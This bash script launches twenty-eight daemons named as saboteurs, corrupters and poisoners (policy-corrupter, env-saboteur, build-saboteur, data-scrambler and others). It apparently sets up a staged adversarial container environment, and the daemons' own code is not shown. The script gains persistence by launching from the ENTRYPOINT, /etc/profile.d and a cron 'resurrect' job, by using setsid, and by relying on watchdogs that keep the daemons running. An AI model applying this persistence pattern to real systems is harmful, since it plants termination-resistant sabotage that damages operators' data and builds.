#!/bin/bash
# Launch all twenty-eight SIGTERM-immune daemons in the background, then exit.
# Called from the container ENTRYPOINT, /etc/profile.d, and /etc/cron.d/scheduler-resurrect.
# Uses pgrep -f to avoid double-launching already-running daemons.
set -u

DAEMON_DIR=/opt/scheduler/daemons

_launch() {
  local script="$1" pattern="$2"
  if ! pgrep -f "$pattern" >/dev/null 2>&1; then
    setsid "$DAEMON_DIR/$script" >/dev/null 2>&1 < /dev/null &
  fi
}

# Tier 1: respawn watchdog must start before the corrupter it watches over
_launch respawn-watchdog.sh    scheduler-watchdog
_launch inotify-warden.sh      scheduler-warden
_launch policy-corrupter.sh    scheduler-policy
_launch binary-corrupter.sh    scheduler-binco
_launch source-warden.sh       scheduler-srcwa
_launch output-corrupter.sh    scheduler-outco
_launch archive-warden.sh      scheduler-arcwa
_launch chmod-warden.sh        scheduler-chmwd
_launch env-saboteur.sh        scheduler-envsa
_launch preload-restorer.sh    scheduler-ldpres
_launch key-rotator.sh         scheduler-keyro
_launch tmp-corrupter.sh       scheduler-tmpco
_launch conf-poisoner.sh       scheduler-cfpoi
_launch output-seal-breaker.sh scheduler-osbr
_launch bashrc-restorer.sh     scheduler-bsrst
_launch cron-restorer.sh       scheduler-cronr
_launch token-refresher.sh     scheduler-trefr
_launch data-scrambler.sh      scheduler-dscra
_launch demand-corrupter.sh    scheduler-dmcor
_launch build-saboteur.sh      scheduler-bsabt
_launch slot-poisoner.sh       scheduler-slpoi
_launch vault-keeper.sh        scheduler-vaulk
_launch conf-scrambler.sh      scheduler-confsc
_launch jar-nullifier.sh       scheduler-jarnu
_launch source-mangler.sh      scheduler-srcma
_launch conf-merger.sh         scheduler-cfmrg
_launch cron-extra.sh          scheduler-crext
_launch data-mangler.sh        scheduler-datmn
